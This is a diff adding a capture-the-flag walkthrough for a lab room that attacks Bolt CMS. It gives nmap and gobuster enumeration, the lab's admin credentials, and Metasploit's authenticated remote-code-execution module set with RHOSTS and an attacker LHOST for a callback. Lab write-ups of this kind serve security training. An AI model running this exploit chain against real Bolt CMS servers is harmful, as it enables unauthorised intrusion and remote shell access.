@@ -1,1 +1,51 @@
+1. Room Information 
 
+--> Machin Type : Linux
+--> Room Name: Bolt 
+--> Category: Web,CMS Exploitation
+--> Target : Bolt CMS
+
+2. Port Scanning using {Nmap}
+
+--> nmap 192.168.22 //<Targat_IP>
+    Expected Ports:
+    | Port | Service |
+    |------|---------|
+    | 22   |   SSH   |
+    | 80   |   HTTP  |
+
+3. Web Enumeration
+
+open this url=>http://192.168.22<Target_IP>:Port   // (8000)
+or 
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
+ex-> /bolt,/login etc. 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+----->Definition of Gobuster:<-------
+Gobuster is a command-line tool used for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names on web servers. It works by sending HTTP requests using a predefined wordlist to discover hidden or unlinked resources on a target system.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4. bolt CMS login 
+
+--> Username: bolt
+--> Password: boltadmin123
+
+5. Vulnerability Search
+--> Searchspolit bolt
+   --> use exploit/unix/webapp/bolt_authenticated_rce
+6. Metasploit Exploit
+--> msfconsole
+--> search bolt
+--> use exploit/unix/webapp/bolt_authenticated_rce
+--> show options
+7. set exploit
+  -> set Username bolt
+  -> set password boltadmin123
+  -> set RHOSTS <IP>
+  -> set LHOST  <your_IP>
+  -> Run
+
+
+
+
+
+  
